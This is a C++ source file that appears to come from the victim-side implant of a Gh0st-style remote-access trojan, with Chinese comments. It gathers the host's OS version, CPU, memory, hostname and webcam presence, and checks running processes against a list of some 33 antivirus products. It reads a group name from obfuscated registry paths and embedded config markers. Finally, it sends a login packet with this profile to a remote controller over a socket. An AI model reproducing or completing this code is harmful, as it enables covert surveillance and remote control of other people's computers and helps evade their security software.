#pragma once
#include "KernelManager.h"
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>


#include "until.h"
#include "install.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")

/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//枚举视频设备
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	CoUninitialize();                   //卸载COM库
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;
	
	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "MotherFucker", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{
	char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	if (szGetGroup == NULL)
	{
		return -1;
	}

	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

std::string getSystemName()
{
	std::string vname("未知操作系统");
	//先判断是否为win8.1或win10
	typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);

	SYSTEM_INFO info;                //用SYSTEM_INFO结构判断64位AMD处理器
	GetSystemInfo(&info);            //调用GetSystemInfo函数填充结构
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&os);
	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
	{
		vname = "Windows 8.1";
		printf_s("此电脑的版本为:%s\n", vname.c_str());
		return vname;
	}
	if (dwMajor == 10 && dwMinor == 0)	//win 10
	{
		if (os.wProductType == VER_NT_SERVER)
		{
			vname = "2016";
			//printf_s("此电脑的版本为:%s\n", vname.c_str());
			return vname;
		}
		else
		{
			vname = "Windows 10";
			return vname;
		}
		
	}



	//下面不能判断Win Server，因为本人还未有这种系统的机子，暂时不给出

	//判断win8.1以下的版本

	if (GetVersionEx((OSVERSIONINFO*)&os))
	{
		//下面根据版本信息判断操作系统名称
		switch (os.dwMajorVersion)
		{                    //判断主版本号
		case 4:
			switch (os.dwMinorVersion)
			{                //判断次版本号
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					vname = "Windows NT 4.0";  //1996年7月发布
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					vname = "Windows 95";
				break;
			case 10:
				vname = "Windows 98";
				break;
			case 90:
				vname = "Windows Me";
				break;
			}
			break;
		case 5:
			switch (os.dwMinorVersion)
			{               //再比较dwMinorVersion的值
			case 0:
				vname = "Windows 2000";    //1999年12月发布
				break;
			case 1:
				vname = "Windows XP";      //2001年8月发布
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION &&
					info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
					vname = "Windows XP Professional x64 Edition";
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					vname = "Windows Server 2003";   //2003年3月发布
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					vname = "Windows Server 2003 R2";
				break;
			}
			break;
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows Vista";
				else
					vname = "Windows Server 2008";   //服务器版本
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 7";
				else
					vname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 8";
				else
					vname = "Windows Server 2012";
				break;
			}
			break;
		default:
			vname = "未知操作系统";
		}
		printf_s("此电脑的版本为:%s\n", vname.c_str());
	}
	else
		printf_s("版本获取失败\n");
	return vname;
}


typedef struct
{
	char* Course;
	char* Name;
}AYSDFE;



AYSDFE g_AntiVirus_Data[40] =
{
	{"360tray.exe",       "360安全卫士"},
	{"360sd.exe",         "360杀毒"},
	{"kxetray.exe",       "金山毒霸"},
	{"KSafeTray.exe",     "金山安全卫士"},
	{"QQPCRTP.exe",       "QQ电脑管家"},
	{"HipsTray.exe",      "火绒"},
	{"BaiduSd.exe",       "百度杀毒"},
	{"baiduSafeTray.exe", "百度卫士"},
	{"KvMonXP.exe",       "江民"},
	{"RavMonD.exe",       "瑞星"},
	{"QUHLPSVC.EXE",      "QuickHeal"},   //印度
	{"mssecess.exe",      "微软MSE"},
	{"cfp.exe",           "Comodo杀毒"},
	{"SPIDer.exe",        "DR.WEB"},      //大蜘蛛
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "安博士V3"},
	{"AYAgent.aye",       "韩国胶囊"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},    //芬安全
	{"avp.exe",           "卡巴"},
	{"Mcshield.exe",      "麦咖啡"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "可牛"},
	{"TMBMSRV.exe",       "趋势"},
	{"avcenter.exe",      "小红伞"},
	{"ashDisp.exe",       "Avast网络安全"},
	{"rtvscan.exe",       "诺顿"},
	{"remupd.exe",        "熊猫卫士"},
	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe反病毒"}, //巴西
	{"ad-watch.exe",      "Ad-watch反间谍"},
	{"K7TSecurity.exe",   "K7杀毒"},
	{"UnThreat.exe",      "UnThreat"},    //保加利亚
	{"  ",                "  "}
};

char* ssdd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Data[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Data[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}

	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "暂未发现");
	}

	return AllName;
}
int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	//LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	strcpy_s(LoginInfo.OsVerInfoEx, getSystemName().c_str());
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	/*----------------------------------------------------------------------------------------*/	
	SYSTEM_INFO siSysInfo; 
	GetSystemInfo(&siSysInfo); 	
	wsprintf(LoginInfo.CPUNumber, "%d", siSysInfo.dwNumberOfProcessors);
	/*----------------------------------------------------------------------------------------*/
	//内存大小
    MEMORYSTATUS    MemInfo; 
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys/1024/1024;
	
	//视频
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;
	
	// 杀毒软件
	strcpy(LoginInfo.Virus, ssdd());
//	char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
//	if (szGroup == NULL)
//	{
//		return -1;
//	}
//	szGroup = (char *)(MyDecode(szGroup + 4));  //解密被加密的字符串
//	
//	char	*szVersion = (char *)FindConfigString(CKernelManager::g_hInstance, "MNOP");
//	if (szVersion == NULL)
//	{
//		return -1;
//	}
//	szVersion = (char *)(MyDecode(szVersion + 4));  //解密被加密的字符串
//	
//	//上线版本
//	//char tQjcs[] = {'Q','E','U','/','P','2','d','o','L','X','B','s','a','k','8','=','\0'};
////	char Version[256];
//	strcpy(LoginInfo.szVersion, szVersion);
//
//	// 上线分组
//	char	*UpRow = NULL;
//	char Group[256];
//	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
//	if(GetGroupName(Group, sizeof(Group))==0)
//	{
//		if(szGroup != NULL)
//		{
//			UpRow = szGroup;
//		}
//		else
//		{
//			UpRow = strWirn2;
//		}
//	}
//	else
//	{
//		UpRow=Group;
//	}
	char* szGroup = "11";
	strcpy(LoginInfo.UpGroup, szGroup);
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}